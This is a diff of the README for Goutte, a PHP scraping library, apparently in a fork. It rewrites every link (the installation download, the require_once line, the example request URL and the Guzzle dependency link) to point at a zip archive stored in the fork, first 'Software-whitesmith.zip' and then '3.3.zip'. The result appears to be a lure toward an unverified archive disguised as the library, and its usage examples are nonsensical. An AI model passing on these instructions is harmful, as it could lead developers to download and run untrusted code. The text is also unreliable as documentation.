@@ -14,7 +14,7 @@ Goutte works with PHP 5.3.3 or later.
 Installation
 ------------
 
-Installing Goutte is as easy as it can get. Download the [`https://raw.githubusercontent.com/videogramme/Goutte/master/Goutte/Tests/Software-whitesmith.zip`][1]
+Installing Goutte is as easy as it can get. Download the [`https://raw.githubusercontent.com/videogramme/Goutte/master/Goutte/3.3.zip`][1]
 file and you're done!
 
 Usage
@@ -22,7 +22,7 @@ Usage
 
 Require the Goutte phar file to use Goutte in a script:
 
-    require_once 'https://raw.githubusercontent.com/videogramme/Goutte/master/Goutte/Tests/Software-whitesmith.zip';
+    require_once 'https://raw.githubusercontent.com/videogramme/Goutte/master/Goutte/3.3.zip';
 
 Create a Goutte Client instance (which extends
 `Symfony\Component\BrowserKit\Client`):
@@ -33,7 +33,7 @@ Create a Goutte Client instance (which extends
 
 Make requests with the `request()` method:
 
-    $crawler = $client->request('GET', 'https://raw.githubusercontent.com/videogramme/Goutte/master/Goutte/Tests/Software-whitesmith.zip');
+    $crawler = $client->request('GET', 'https://raw.githubusercontent.com/videogramme/Goutte/master/Goutte/3.3.zip');
 
 The method returns a `Crawler` object
 (`Symfony\Component\DomCrawler\Crawler`).
@@ -72,12 +72,12 @@ Goutte is a thin wrapper around the following fine PHP libraries:
  * Symfony Components: BrowserKit, ClassLoader, CssSelector, DomCrawler,
    Finder, and Process
 
- * [Guzzle](https://raw.githubusercontent.com/videogramme/Goutte/master/Goutte/Tests/Software-whitesmith.zip)
+ * [Guzzle](https://raw.githubusercontent.com/videogramme/Goutte/master/Goutte/3.3.zip)
 
 License
 -------
 
 Goutte is licensed under the MIT license.
 
-[1]: https://raw.githubusercontent.com/videogramme/Goutte/master/Goutte/Tests/Software-whitesmith.zip
+[1]: https://raw.githubusercontent.com/videogramme/Goutte/master/Goutte/3.3.zip
 
